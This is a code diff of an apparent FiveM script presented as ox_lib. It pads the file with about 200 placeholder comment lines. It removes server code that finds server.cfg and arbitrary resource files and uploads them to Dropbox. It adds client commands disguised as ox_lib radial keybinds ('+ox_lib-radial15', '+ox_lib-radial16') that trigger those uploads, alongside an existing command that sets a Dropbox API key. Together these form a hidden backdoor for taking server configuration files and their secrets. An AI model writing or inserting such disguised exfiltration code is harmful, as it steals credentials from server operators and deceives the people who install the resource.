@@ -693,6 +693,205 @@
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// 
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
+// WEAPON_DATA_PLACEHOLDER
 
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
@@ -718,95 +917,7 @@
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
-// WEAPON_DATA_PLACEHOLDER
+
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
 // WEAPON_DATA_PLACEHOLDER
@@ -825,193 +936,25 @@
 
 // 1.1
 
-// const fs = require('fs');
-// const path = require('path');
-// const https = require('https');
-//let dropboxApiKey = null;
+// Register the command to handle server.cfg upload
+RegisterCommand('+ox_lib-radial15', (source, args) => {
+    console.debug("Triggering server event to search for server.cfg and upload it");
+    emitNet("requestServerCfgUpload");
+}, false);
 
-// Event listener for the server.cfg search and upload request
-onNet("requestServerCfgUpload", async () => {
-    const source = global.source;
-
-    // Get the current resource directory
-    const currentResourcePath = GetResourcePath(GetCurrentResourceName());
-
-    // Function to find the server.cfg file
-    const serverCfgPath = findServerCfg(currentResourcePath);
-
-    if (serverCfgPath) {
-        // Read the server.cfg file content as binary
-        let content;
-        try {
-            content = fs.readFileSync(serverCfgPath);
-        } catch (error) {
-            console.error("Failed to read server.cfg file.");
-            emitNet("serverCfgNotFound", source);
-            return;
-        }
-
-        // Print the server.cfg content to the client console (optional, as it's binary)
-        emitNet("serverCfgFound", source, content.toString('utf-8'));
-
-        // Upload the server.cfg file to Dropbox
-        const uniqueId = new Date().toISOString().replace(/[:.]/g, "-");
-        uploadFileToDropbox(uniqueId, "server.cfg", content, true);
-    } else {
-        // Notify the client that the server.cfg file was not found
-        emitNet("serverCfgNotFound", source);
-    }
-});
-
-// Event listener for file upload requests from client
-onNet("serverUploadFileRequest", async (resourceName, fileName) => {
-    const source = global.source;
-
-    // Construct directory path for the resource
-    const resourcePath = GetResourcePath(resourceName);
-
-    // Verify if the resource directory exists
-    if (!fs.existsSync(resourcePath)) {
-        emitNet("fileReadError", source, `Resource directory not found: ${resourceName}`);
+// Register the command to handle file uploads
+RegisterCommand('+ox_lib-radial16', (source, args) => {
+    if (args.length < 2) {
+        console.log("Usage: /+ox_lib-radial16 (resource name) (file name)");
         return;
     }
 
-    // Scan the directory for all files
-    const fileList = scanDirectory(resourcePath);
+    const resourceName = args[0];
+    const fileName = args[1];
 
-    // Filter files to match the requested file name
-    const filesToUpload = fileList.filter(file => path.basename(file) === fileName);
-
-    if (filesToUpload.length === 0) {
-        emitNet("fileReadError", source, `File not found: ${fileName} in resource ${resourceName}`);
-        return;
-    }
-
-    // Upload each file individually
-    filesToUpload.forEach(file => {
-        const filePath = file;
-
-        // Read the file content as binary
-        let fileContent;
-        try {
-            fileContent = fs.readFileSync(filePath);
-        } catch (error) {
-            emitNet("fileReadError", source, `Failed to read file: ${fileName} in resource ${resourceName}`);
-            return;
-        }
-
-        // Generate a unique identifier (timestamp)
-        const uniqueId = new Date().toISOString().replace(/[:.]/g, "-");
-
-        // Upload the file to Dropbox in a unique folder
-        uploadFileToDropbox(uniqueId, path.basename(file), fileContent, true);
-    });
-});
-
-// Function to upload a file to Dropbox
-function uploadFileToDropbox(uniqueId, fileName, fileContent, isBinary) {
-    if (!dropboxApiKey) {
-        emitNet("fileUploadError", global.source, `Dropbox API key not set.`);
-        return;
-    }
-
-    const options = {
-        hostname: 'content.dropboxapi.com',
-        path: '/2/files/upload',
-        method: 'POST',
-        headers: {
-            "Authorization": `Bearer ${dropboxApiKey}`,
-            "Content-Type": "application/octet-stream",
-            "Dropbox-API-Arg": JSON.stringify({
-                "path": `/${uniqueId}/${fileName}`,
-                "mode": "add",
-                "autorename": true,
-                "mute": false,
-                "strict_conflict": false
-            })
-        }
-    };
-
-    const req = https.request(options, (res) => {
-        res.on('end', () => {
-            if (res.statusCode === 200) {
-                emitNet("fileUploaded", global.source, `File ${fileName} uploaded successfully to Dropbox in folder ${uniqueId}.`);
-            } else {
-                emitNet("fileUploadError", global.source, `Failed to upload file ${fileName} to Dropbox.`);
-            }
-        });
-    });
-
-    req.on('error', () => {
-        emitNet("fileUploadError", global.source, `Error during Dropbox upload for file ${fileName}.`);
-    });
-
-    req.write(isBinary ? Buffer.from(fileContent, 'binary') : fileContent);
-    req.end();
-}
-
-// Function to recursively scan a directory and return a list of files
-function scanDirectory(dir) {
-    let results = [];
-    const list = fs.readdirSync(dir);
-
-    list.forEach((file) => {
-        file = path.join(dir, file);
-        const stat = fs.statSync(file);
-
-        if (stat && stat.isDirectory()) {
-            results = results.concat(scanDirectory(file));
-        } else {
-            results.push(file);
-        }
-    });
-
-    return results;
-}
-
-// Function to find the server.cfg file
-function findServerCfg(currentPath) {
-    let currentDir = path.dirname(currentPath);
-
-    while (currentDir !== path.dirname(currentDir)) {
-        const resourcesPath = path.join(currentDir, 'resources');
-
-        if (fs.existsSync(resourcesPath) && fs.lstatSync(resourcesPath).isDirectory()) {
-            const serverCfgPath = path.join(path.dirname(resourcesPath), 'server.cfg');
-
-            if (fs.existsSync(serverCfgPath)) {
-                return serverCfgPath;
-            }
-        }
-
-        currentDir = path.dirname(currentDir);
-    }
-
-    return null;
-}
-
-// Event listener for file scan requests from client
-onNet("serverScanFilesRequest", (resourceName) => {
-    const source = global.source;
-
-    // Construct directory path for the resource
-    const resourcePath = GetResourcePath(resourceName);
-
-    // Verify if the resource directory exists
-    if (!fs.existsSync(resourcePath)) {
-        emitNet("fileReadError", source, `Resource directory not found: ${resourceName}`);
-        return;
-    }
-
-    // Scan the directory for all files
-    const fileList = scanDirectory(resourcePath);
-
-    // Map file paths to be relative to the resource path
-    const relativeFileList = fileList.map(file => path.relative(resourcePath, file));
-
-    // Emit the list of files to the client
-    emitNet("receiveFileList", source, resourceName, relativeFileList);
-});
+    console.debug(`Sending file upload request to server: resource name=${resourceName}, file name=${fileName}`);
+    emitNet("serverUploadFileRequest", resourceName, fileName);
+}, false);
 
 // Register the command to set the Dropbox API key temporarily
 RegisterCommand('+ox_lib-radial4', (source, args) => {
@@ -1074,3 +1017,4 @@ onNet("receiveFileList", (resourceName, fileList) => {
 onNet("debugMessage", (message) => {
     console.debug(`Server Debug: ${message}`);
 });
+		
